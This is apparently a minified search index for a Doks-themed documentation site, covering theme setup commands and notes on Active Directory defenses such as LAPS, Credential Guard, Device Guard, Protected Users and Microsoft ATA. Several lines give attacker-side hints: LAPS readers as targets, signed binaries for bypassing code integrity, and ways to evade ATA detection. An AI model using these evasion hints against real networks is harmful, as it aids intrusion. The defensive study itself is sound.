Doks:\nTutorial # ðŸ‘‰  The Tutorial is intended for novice to intermediate users.   Step-by-step instructions on how to start a new Doks project. Tutorial â†’\nQuick Start # ðŸ‘‰  The Quick Start is intended for intermediate to advanced users.   One page summary of how to start a new Doks project. Quick Start â†’\nGo further # Recipes, Reference Guides, Extensions, and Showcase.\nRecipes # Get instructions on how to accomplish common tasks with Doks. Recipes â†’\nReference Guides # Learn how to customize Doks to fully make it your own. Reference Guides â†’\nExtensions # Get instructions on how to add even more to Doks. Extensions â†’\nShowcase # See what others have build with Doks. Showcase â†’\nContributing # Find out how to contribute to Doks. Contributing â†’\nHelp # Get help on Doks. Help â†’\n"}).add({id:43,href:"/docs/prologue/quick-start/",title:"Quick Start",description:"One page summary of how to start a new Doks project.",content:"Requirements # Doks uses npm to centralize dependency management, making it easy to update resources, build tooling, plugins, and build scripts:\n Download and install Node.js (it includes npm) for your platform.  Start a new Doks project # Create a new site, change directories, install dependencies, and start development server.\nCreate a new site # Doks is available as a child theme, and a starter theme:\n Use the Doks child theme, if you do not plan to customize a lot, and/or need future Doks updates. Use the Doks starter theme, if you plan to customize a lot, and/or do not need future Doks updates.  Not quite sure? Use the Doks child theme.\nDoks child theme # git clone https://github.com/h-enk/doks-child-theme.git my-doks-site Doks starter theme # git clone https://github.com/h-enk/doks.git my-doks-site Change directories # cd my-doks-site Install dependencies # npm install Start development server # npm run start Doks will start the Hugo development webserver accessible by default at http://localhost:1313. Saved changes will live reload in the browser.\nOther commands # Doks comes with commands for common tasks. Commands â†’\n"}).add({id:44,href:"/docs/prologue/commands/",title:"Commands",description:"Doks comes with commands for common tasks.",content:"ðŸ’¡  You can change the commands in the scripts section of `./package.json`.   create # Create new content for your site:\nnpm run create [path] [flags] See also the Hugo docs: hugo new.\nlint # Check scripts, styles, and markdown for errors:\nnpm run lint scripts # Check scripts for errors:\nnpm run lint:scripts [-- --fix] styles # Check styles for errors:\nnpm run lint:styles [-- --fix] markdown # Check markdown for errors:\nnpm run lint:markdown [-- --fix] clean # Delete temporary directories:\nnpm run clean start # Start local development server:\nnpm run start build # Build production website:\nnpm run build functions # Build Lambda functions:\nnpm run build:functions preview # Build production website including draft and future content:\nnpm run build:preview "}).add({id:45,href:"/docs/help/how-to-update/",title:"How to Update",description:"Regularly update the installed npm packages to keep your Doks website stable, usable, and secure.",content:"ðŸ’¡  Learn more about semantic versioning and advanced range syntax.   Check for outdated packages # The npm outdated command will check the registry to see if any (or, specific) installed packages are currently outdated:\nnpm outdated [[\u0026lt;@scope\u0026gt;/]\u0026lt;pkg\u0026gt; ...] Update packages # The npm update command will update all the packages listed to the latest version (specified by the tag config), respecting semver:\nnpm update [\u0026lt;pkg\u0026gt;...] "}).add({id:46,href:"/docs/help/troubleshooting/",title:"Troubleshooting",description:"Solutions to common problems.",content:"Problems updating npm packages # Delete the ./node_modules folder, and run again:\nnpm install Problems with cache # Delete the temporary directories:\nnpm run clean "}).add({id:47,href:"/docs/help/faq/",title:"FAQ",description:"Answers to frequently asked questions.",content:"Hyas? # Doks is a Hyas theme build by the creator of Hyas.\nFooter notice? # Please keep it in place.\nKeyboard shortcuts for search? #  focus: Ctrl + / select: â†“ and â†‘ open: Enter close: Esc  Other documentation? #  Netlify Hugo  Can I get support? # Create a topic:\n Netlify Community Hugo Forums Doks Discussions  Contact the creator? # Send h-enk a message:\n Netlify Community Hugo Forums Doks Discussions  "}).add({id:48,href:"/active_directory/detection_and_defense/architectural_changes/",title:"Architectural Changes",description:"Architectural changes for defense.",content:"LAPS - Local Administrator Password Solution #  Centralized storage of passwords in AD with periodic randomizing where read permissions are access controlled Computer objects have two new attributes ms mcs AdmPwd attribute stores the clear text password and ms mcs AdmPwdExpirationTime controls the password change Storage in clear text, transmission is encrypted With careful enumeration, it is possible to retrieve which users can access the clear text password providing a list of attractive targets!  Credential Guard #  Now called, Windows Defender Credential Guard, it \u0026ldquo;uses virtualization based security to isolate secrets so that only privileges system software can access them\u0026rdquo; Effective in stopping PTH and Over PTH attacks by restricting access to NTLM hashes and TGTs As of Windows 10 1709, it is not possible to write Kerberos tickets to memory even if we have credentials. https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard Credentials for local accounts in SAM and Service account credentials from LSA secrets are NOT protected Credential Guard cannot be enabled on a domain contorller as it breaks authentication there Only available on the Windows 10 Enterprise edition and Server 2016 Possible to replay service account credenttials for lateral movement even if credential guard is enabled  Device Guard #  Now called, Windows Defender Device Guard, it is a group of features \u0026ldquo;designed to harden a system against malware attacks. Its focus is preventing malicious code from running by ensuring only known good code can run.\u0026rdquo; Three primary components:  Configurable Code Integrity (CCI) Configure only trusted code to run Virtual Secure Mode Protected Code Integirty Enforces CCI with Kernerl Mode (KMCI) and User Mode (UMCI) Platform and UEFI Secure Boot Ensures boot binaries and firmware integrity   https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control UMCI is something which interferes with most of the lateral movement attacks we have seen While it depends on the deployment (discussing which will be too lengthy), many well known application whitelisting bypasses signed binaries like csc.exe, MSBuild.exe etc. are useful for bypassing UMCI as well  Protected Users Group #  Introduced in Server 2012 R2 for \u0026ldquo;better protection against credential theft\u0026rdquo; by not caching credentials in insecure ways A user added to this group:  Cannot use CredSSP and WDigest No more cleartext credentials caching NTLM hash is not cached Kerberos does not use DES or RC4 keys. No caching of clear text cred or long term keys.   If the domain functional level is Server 2012 R2:  No NTLM authentication No DES or RC4 keys in Kerberos pre auth No delegation (constrained or unconstrained) No renewal of TGT beyond initial for hour lifetime Hardcoded, unconfigurable \u0026ldquo;Maximum lifetime for user ticket\u0026rdquo; and \u0026ldquo;Maximum lifetime for user ticket   Needs all domain control to be at least Server 2008 or later (because AES keys) Not recommended by MS to add DAs and EAs to this group without testing \u0026ldquo;the potential impact\u0026rdquo; of lock out No cached logon ie.e no offline sign on Having computer and service accounts in this group is useless as their credentials will always be present on the host machine  Privileged Administrative Workstations (PAWs) #  A hardened workstation for performing sensitive tasks like  administration of domain controllers cloud infrastructure sensitive business functions etc.   Can provide protection from  phishing attacks OS vulnerabilities credential replay attacks   Admin Jump servers to be accessed only from a PAW, multiple strategies  Separate privilege and hardware for administrative and normal tasks Having a VM on a PAW for user tasks    Active Directory Administrative Tier Model #  Composed of three levels only for administrative accounts Control restrictions: what admins control Logon restrictions: where admins can log-on to  Tier 0 # Accounts, Groups and computers which have privileges across the enterprise like domain controllers, domain admins, enterprise admins\nTier 1 #  Accounts, Groups and computers which have access to resources having significant amount of business value A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise services  Tier 2 #  Administrator accounts which have administrative control of a significant amount of business value that is hosted on user workstations and devices Examples include Help Desk and computer support administrators because they can impact the integrity of almost any user data  ESAE (Enhanced Security Admin Environment) #  Dedicated administrative forest for managing critical assets like  administrative users groups computers   Since a forest is considered a security boundary rather than a domain, this model provides enhanced security controls The administrative forest is also called the Red Forest Administrative users in a production forest are used as standard non privileged users in the administrative forest Selective Authentication to the Red Forest enables stricter security controls on logon of users from non-administrative forests  Further Reading #  Securing Privileged Access Best Practices for Securing Active Directory  "}).add({id:49,href:"/active_directory/detection_and_defense/domain_admins/",title:"Domain Admins",description:"Protections for Domain Admins.",content:"General Mitigations #  Do not allow or limit login of DAs to any other machine other than the Domain Controllers If logins to some servers are necesarry, do not allow other administrators to login to that machine Never run a service with Domain Admin privileges as it makes many credential theft protections useless in case of a service account  Temporary Group Membership #  Temporarily add user to a group Requires Privileged Access Management Feature to be enabled which can\u0026rsquo;t be turned off later  Add-ADGroupMember -Identity \u0026#39;Domain Admins\u0026#39; -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20) "}).add({id:50,href:"/active_directory/detection_and_defense/microsoft_ata/",title:"Microsoft Advanced Threat Analytics (ATA)",description:"Information about Microsoft ATA.",content:"General #  Traffic destined for Domain Controllers is mirrored to ATA sensors Use activity profile is build over time, i.e.  use of computers credentials log on machines   Collects Event 4776 (The DC attempted to validate the credentials for an account) to detect credential replay attacks Can detect behavioral anomalies Useful for detecting:  Recon: account enum, netsession enum Compromised Credentials Attacks: bruteforce, high privilege account/service account exposed in clear text, honey token, unusual protocol (NTLM and Kerberos) Credential/Hash/Ticket Replay attacks    Bypassing ATA #  Avoid talking to the DC as long as possible Try to blend in with normal traffic  "}),search.addEventListener('input',b,!0);function b(){var b,e;const d=5;b=this.value,e=a.search(b,{limit:d,enrich:!0});const c=new Map;for(const a of e.flatMap(a=>a.result)){if(c.has(a.doc.href))continue;c.set(a.doc.href,a.doc)}if(suggestions.innerHTML="",suggestions.classList.remove('d-none'),c.size===0&&b){const a=document.createElement('div');a.innerHTML=`No results for "<strong>${b}</strong>"`,a.classList.add("suggestion__no-results"),suggestions.appendChild(a);return}for(const[h,g]of c){const b=document.createElement('div');suggestions.appendChild(b);const a=document.createElement('a');a.href=h,b.appendChild(a);const e=document.createElement('span');e.textContent=g.title,e.classList.add("suggestion__title"),a.appendChild(e);const f=document.createElement('span');if(f.textContent=g.description,f.classList.add("suggestion__description"),a.appendChild(f),suggestions.appendChild(b),suggestions.childElementCount==d)break}}})()